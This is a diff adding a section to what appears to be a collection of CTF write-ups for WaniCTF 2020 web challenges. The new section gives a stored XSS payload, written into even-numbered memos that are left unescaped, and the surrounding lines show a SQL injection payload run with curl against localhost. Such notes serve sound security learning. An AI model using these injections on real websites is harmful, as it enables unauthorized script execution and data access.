@@ -355,6 +355,16 @@ curl -s http://localhost:30001 | grep -o 'FLAG{.*}'
 curl -s 'http://localhost:8080/index.php?year=(2016)OR(1)=(1)' | grep -o 'FLAG{.*}'
 ```
 
+## striped_table
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/web/striped_table
+
+偶数番目のメモに下記を書き込む(偶数番目はエスケープされない)
+
+```
+<script>alert(19640503)</script>
+```
+
 ## SQL_challenge_2
 
 - https://github.com/wani-hackase/wanictf2020-writeup/tree/master/web/SQL_challenge_2
